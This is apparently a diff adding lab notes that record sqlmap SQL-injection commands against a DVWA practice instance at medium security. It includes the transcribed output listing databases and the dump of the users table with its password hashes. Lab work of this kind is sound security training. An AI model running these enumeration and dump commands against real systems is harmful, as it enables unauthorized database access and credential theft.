@@ -1,0 +1,23 @@
+$ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=<value>; security=medium" \
+  --batch --dbs | tee medium.txt
+
+$ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=<value>; security=medium" \
+  --batch -D dvwa -T users --dump | tee -a medium.txt
+
+NOTE: Transcribed from terminal captures taken at the time. The raw file is
+medium.txt in the original lab folder.
+
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+Database: dvwa
+Table: users
+[5 entries] -- identical to the Low-level dump: same 5 users, same password
+hashes (admin, gordonb, 1337, pablo, smithy).
+
+sqlmap prompted: "you provided a HTTP Cookie header value, while target URL
+provides its own cookie(s) within HTTP Set-Cookie header which intersect
+with yours. Do you want to merge them in further requests? [Y/n] Y"
